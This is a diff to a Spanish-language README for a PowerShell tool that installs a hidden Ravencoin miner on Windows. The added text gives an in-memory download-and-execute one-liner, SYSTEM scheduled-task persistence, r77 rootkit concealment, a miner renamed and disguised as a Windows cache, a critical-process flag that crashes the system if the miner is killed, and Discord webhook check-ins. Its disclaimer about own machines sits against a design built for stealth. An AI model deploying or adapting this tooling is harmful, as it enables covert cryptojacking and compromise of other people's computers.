@@ -1,3 +1,4 @@
+
 # AutoMine (Stealth Edition)
 
 Automatización avanzada de minería de Ravencoin (RVN) con GMiner en Windows. Integra persistencia vía Tarea Programada (SYSTEM), ocultamiento mediante Rootkit (r77), protección contra cierre (Proceso Crítico) y notificaciones vía Discord.
@@ -40,3 +41,80 @@ Esta herramienta está diseñada para ser utilizada **únicamente en equipos de 
               -Pool "us-rvn.2miners.com:6060" `
               -Algo "kawpow" `
               -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
+```
+
+Método 2: Ejecución en Memoria (Sin descargar a disco)
+
+Ideal para despliegues rápidos. Abre PowerShell como Administrador y ejecuta el equivalente a curl | bash de Linux:
+
+```powershell
+iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'TU_WALLET_RVN' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/TU_ID/TU_TOKEN'"
+```
+
+Nota: El script detectará que se ejecutó en memoria y se auto-descargará de forma segura a la carpeta oculta para poder registrar la Tarea Programada.
+
+Parámetros del Script
+
+Parámetro Descripción Valor por defecto
+-Wallet Dirección de la wallet de Ravencoin. (requerido)
+-Pool Dirección del pool (formato host:puerto). (requerido)
+-Algo Algoritmo de minería. Para RVN es kawpow. kawpow
+-Worker Nombre del rig en el pool. Si se omite, se genera un hash SHA256 del equipo (rig_xxxxxx). rig_<hash>
+-DiscordWebhook URL del Webhook de Discord para notificaciones. (opcional)
+-Foreground Ejecuta el watcher en la ventana actual (para depuración, sin rootkit). false
+-TestWebhook Envía un embed de prueba al Webhook y termina. false
+-Diagnose Muestra el estado de la instalación y los procesos. false
+-Uninstall Detiene el minero de forma segura, elimina la tarea y limpia todo. false
+-Run Modo interno del watcher. No usar manualmente. false
+-NoElevate Modo interno para evitar el bucle de UAC. No usar manualmente. false
+
+Estructura de Archivos
+
+```
+C:\ProgramData\Microsoft\Windows\Caches\WinCache\   [OCULTO POR EL ROOTKIT]
+├── WinCache.exe      # GMiner (renombrado)
+├── WinCache.ps1      # Copia del script de automatización
+└── logs\
+    └── cache.log     # Registro de actividad (camuflado como cache)
+```
+
+Nota: Todos los parámetros se inyectan directamente en la Tarea Programada, por lo que no se crea ningún config.json.
+
+Rootkit, Proceso Crítico y Visibilidad
+
+Debido al rootkit y al estado crítico, el proceso y la carpeta no serán visibles en el Explorador de Windows ni en el Administrador de Tareas.
+
+¿Cómo saber si está funcionando?
+
+1. Discord: Si recibes el mensaje Minero Iniciado, todo está corriendo.
+2. El Pool: Busca tu wallet en 2Miners; si el worker está Online, está minando.
+3. El Log: Puedes leer el archivo directamente si conoces la ruta exacta (el rootkit oculta la enumeración, no bloquea la lectura directa):
+   ```powershell
+   Get-Content "C:\ProgramData\Microsoft\Windows\Caches\WinCache\logs\cache.log" -Tail 20
+   ```
+4. Diagnóstico Integrado: Ejecuta .\Mine.ps1 -Diagnose. Al usar WMI, a veces es capaz de saltarse los hooks del rootkit y mostrar los procesos reales.
+
+ Cómo desinstalar de forma segura
+
+NUNCA uses el Administrador de Tareas para matar WinCache.ps1 o WinCache.exe. Si lo haces, el sistema lanzará un BSOD. Usa siempre:
+
+```powershell
+.\Mine.ps1 -Uninstall
+```
+
+Este comando desactiva el flag de proceso crítico en la memoria, espera un segundo a que Windows lo procese, y luego cierra el proceso sin colapsar el sistema.
+
+ Webhook de Discord
+
+El script envía los siguientes mensajes:
+
+1. ✅ Minero Iniciado: Host, Worker, Pool y confirmación de que las protecciones están activas.
+2. ✅ Actualización Exitosa: Cuando se re-ejecuta el script para cambiar parámetros.
+3. ⚠️ Miner Stopped: Cuando se alcanza el límite de 10 reinicios consecutivos.
+
+Importante: Trata la URL del Webhook como un secreto. Si se filtra, cualquiera puede enviar mensajes a tu canal.
+
+ Licencia
+
+Este proyecto se distribuye con fines educativos y de automatización personal. Úsalo bajo tu propia responsabilidad y únicamente en equipos de tu propiedad.
+
